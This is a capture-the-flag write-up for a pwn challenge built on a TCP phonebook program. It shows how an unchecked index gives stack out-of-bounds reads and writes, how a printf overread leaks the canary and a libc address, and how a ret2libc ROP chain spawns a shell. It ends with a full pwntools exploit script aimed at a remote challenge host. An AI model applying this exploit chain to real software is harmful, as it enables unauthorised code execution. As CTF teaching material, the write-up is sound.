# pwn/phonebook

## Overview

This challenge gives a small phonebook program over TCP.

The core bug is that every phonebook action trusts the user-supplied index, including negative and out-of-bounds values. The records live on `main`'s stack, so an out-of-bounds index lets us read and write data around `main`'s stack frame.

The final working path is:

1. use `list` to overread from record `7` into out-of-bounds record `8`
2. leak the canary
3. leak the libc return address
4. compute libc base
5. overwrite `main`'s saved return address with a stack ROP chain
6. exit the program so `main` returns into our chain
7. run `cat /home/ctf/flag`

## Exploit Chain

### 1. Reverse the binary layout

Disassembling `main`, `create`, `edit`, and `list` shows the stack layout.

`main` allocates the whole phonebook on its stack:

```asm
sub rsp, 0x320
lea rax, [rbp-0x310]
```

So the phonebook base is:

```text
book = rbp - 0x310
```

Each entry is `0x60` bytes:

```c
entry = book + idx * 0x60
phone    = entry + 0x00
lastName = entry + 0x20
firstName= entry + 0x40
```

This comes from the repeated pattern in `create` and `edit`:

```asm
rax = idx
rax = rax*3
shl rax, 5        ; idx * 0x60
add rax, book
```

and then:

```asm
add rax, 0x40     ; firstName
add rax, 0x20     ; lastName
; no add          ; phone
```

The key bug: there is no bounds check on `idx`.

That means an index like `8` or `-1` accesses memory outside the 8 valid entries.

### 2. Identify the interesting out-of-bounds index

For `idx = 8`:

```text
entry8 = (rbp - 0x310) + 8*0x60 = rbp - 0x10
```

So record `8` lands directly on top of `main`'s epilogue data:

```text
entry8.phone    = rbp-0x10 .. rbp+0x0f
entry8.lastName = rbp+0x10 .. rbp+0x2f
entry8.firstName= rbp+0x30 .. rbp+0x4f
```

Breaking down `entry8.phone`:

```text
rbp-0x10 .. rbp-0x09   padding/gap
rbp-0x08 .. rbp-0x01   stack canary
rbp+0x00 .. rbp+0x07   saved rbp
rbp+0x08 .. rbp+0x0f   saved return address
```

This is the index used for the final exploit, because it lets us rewrite:

1. the canary
2. saved `rbp`
3. saved return address
4. the next stack words used by a ROP chain

### 4. Understand why `list` leaks memory

`list` only iterates indexes `0..7`, but it prints strings using `%s`:

```asm
printf("[%d] %s %s / %s", idx, firstName, lastName, phone)
```

It only checks:

```asm
if (firstName[0] != 0)
```

It does not check whether the strings are actually terminated inside the record.

That means if we fill `record[7].firstName` with 32 non-zero bytes, `printf("%s")` keeps reading past the end of record `7` into whatever comes next on the stack.

What comes next is exactly the out-of-bounds record `8`.

So `list` becomes our read primitive.

### 5. Leak the canary

First create record `7` with a fully non-zero `firstName`:

```python
create_entry(p, 7, b"F" * 32)
```

Then write 9 non-zero bytes into `record[8].phone`:

```python
edit8_phone_only(p, b"G" * 9)
```

Why 9 bytes?

Because record `8` starts at `rbp-0x10`, so the first 8 bytes are just the gap before the canary. The 9th byte reaches the first canary byte.

But the real canary starts with `0x00`, which would stop `%s`. By writing one non-zero byte there, `list` continues printing across the canary region.

Then call `list` and parse the first printed line:

```python
marker = b"F" * 32 + b"G" * 9
idx = line.index(marker) + len(marker)
canary = b"\x00" + line[idx:].split(b"  / ")[0][:7]
```

Why prepend `b"\x00"`?

Because the true canary always begins with a zero byte. We overwrote that byte with `G` only to force the leak, so after the leak we reconstruct the real canary as:

```text
00 + leaked_bytes_1_to_7
```

### 6. Leak libc from the saved return address

Now we want the saved return address from `main`, which sits right after saved `rbp`.

To make `printf` continue far enough, we overwrite `record[8].phone` with:

```python
payload = b"H" * 8 + b"I" + canary[1:] + b"J" * 8
```

This does three things:

1. `b"H"*8` fills the gap
2. `b"I" + canary[1:]` makes the canary bytes printable while preserving bytes 1..7
3. `b"J"*8` makes saved `rbp` non-zero, so `%s` keeps going into the return address

Then another `list` leaks the return address:

```python
marker = b"F" * 32 + payload
idx = line.index(marker) + len(marker)
ret_leak = line[idx:].split(b"  / ")[0][:6]
ret_addr = u64(ret_leak.ljust(8, b"\x00"))
```

Only 6 bytes are needed because user-space pointers on x86-64 have the top 2 bytes zero.

The leaked return address is inside libc, not inside the binary. On the real remote image it points at offset:

```text
0x2a1ca
```

So:

```python
libc_base = ret_addr - 0x2A1CA
```

In addition, the needed libc offsets can be found from the Dockerfile base image:

```text
RET      = 0x2882f
POP_RDI  = 0x10f75b
BINSH    = 0x1cb42f
SYSTEM   = 0x58740
EXIT     = 0x47b90
```

### 7. Build the final ROP chain on `main`'s stack

Now restore the real canary and place the ROP chain across `entry8.phone` and `entry8.lastName`.

`entry8.phone` becomes:

```python
phone = b"P" * 8 + canary + p64(1) + p64(libc_base + RET_G)
```

So in memory:

```text
gap         = "P"*8
canary      = real canary
saved rbp   = 1
saved rip   = libc_base + ret
```

`entry8.lastName` holds the rest of the chain:

```python
last = (
    p64(libc_base + POP_RDI) +
    p64(libc_base + BINSH) +
    p64(libc_base + SYSTEM) +
    p64(libc_base + EXIT)
)
```

When `main` exits:

1. `leave; ret` restores `rbp` and returns
2. it lands on a plain `ret` gadget for stack alignment
3. then `pop rdi; ret`
4. `rdi = "/bin/sh"`
5. `system("/bin/sh")`
6. `exit()`

The alignment `ret` matters. Without it, `system` can be entered with the wrong stack alignment and fail.

## Final Solve

```python
#!/usr/bin/env python3
from pwn import *
import time

HOST = "3.38.163.233"
PORT = 33687

RET_OFF = 0x2A1CA
RET_G = 0x2882F
POP_RDI = 0x10F75B
BINSH = 0x1CB42F
SYSTEM = 0x58740
EXIT = 0x47B90


def connect_retry():
    for i in range(30):
        try:
            p = remote(HOST, PORT, timeout=3)
            p.recvuntil(b"> ", timeout=3)
            return p
        except Exception:
            time.sleep(2)
    raise RuntimeError("remote unavailable")


def choose(p, choice):
    p.send(str(choice).encode() + b"\n")


def create_entry(p, idx, first, last=b"\n", phone=b"\n"):
    choose(p, 1)
    p.recvuntil(b"index: ", timeout=3)
    p.send(str(idx).encode() + b"\n")
    p.recvuntil(b"firstName: ", timeout=3)
    p.send(first)
    p.recvuntil(b"lastName: ", timeout=3)
    p.send(last)
    p.recvuntil(b"phoneNumber: ", timeout=3)
    p.send(phone)
    p.recvuntil(b"> ", timeout=3)


def edit8_phone_only(p, payload):
    choose(p, 2)
    p.recvuntil(b"index: ", timeout=3)
    p.send(b"8\n")
    p.recvuntil(b"firstName: ", timeout=3)
    p.send(b"\n")
    p.recvuntil(b"lastName: ", timeout=3)
    p.send(b"\n")
    p.recvuntil(b"phoneNumber: ", timeout=3)
    p.send(payload)
    p.recvuntil(b"> ", timeout=3)


def edit8_full(p, last, phone):
    choose(p, 2)
    p.recvuntil(b"index: ", timeout=3)
    p.send(b"8\n")
    p.recvuntil(b"firstName: ", timeout=3)
    p.send(b"\n")
    p.recvuntil(b"lastName: ", timeout=3)
    p.send(last)
    p.recvuntil(b"phoneNumber: ", timeout=3)
    p.send(phone)
    p.recvuntil(b"> ", timeout=3)


def do_list(p):
    choose(p, 3)
    return p.recvuntil(b"> ", timeout=3)


def main():
    p = connect_retry()

    create_entry(p, 7, b"F" * 32)

    edit8_phone_only(p, b"G" * 9)
    out = do_list(p)
    line = out.split(b"\n")[0]
    marker = b"F" * 32 + b"G" * 9
    idx = line.index(marker) + len(marker)
    canary = b"\x00" + line[idx:].split(b"  / ")[0][:7]
    log.info(f"canary = {canary.hex()}")

    payload = b"H" * 8 + b"I" + canary[1:] + b"J" * 8
    edit8_phone_only(p, payload)
    out = do_list(p)
    line = out.split(b"\n")[0]
    marker = b"F" * 32 + payload
    idx = line.index(marker) + len(marker)
    ret_leak = line[idx:].split(b"  / ")[0][:6]
    ret_addr = u64(ret_leak.ljust(8, b"\x00"))
    libc_base = ret_addr - RET_OFF
    log.info(f"ret = {ret_addr:#x}")
    log.info(f"libc = {libc_base:#x}")

    last = (
        p64(libc_base + POP_RDI)
        + p64(libc_base + BINSH)
        + p64(libc_base + SYSTEM)
        + p64(libc_base + EXIT)
    )
    phone = b"P" * 8 + canary + p64(1) + p64(libc_base + RET_G)
    edit8_full(p, last, phone)

    choose(p, 5)
    time.sleep(0.7)
    p.send(b"cat /home/ctf/flag\n")
    print(p.recvall(timeout=5).decode("latin-1", errors="replace"))


if __name__ == "__main__":
    main()
```

Run it with:

```bash
python3 ./solve.py
```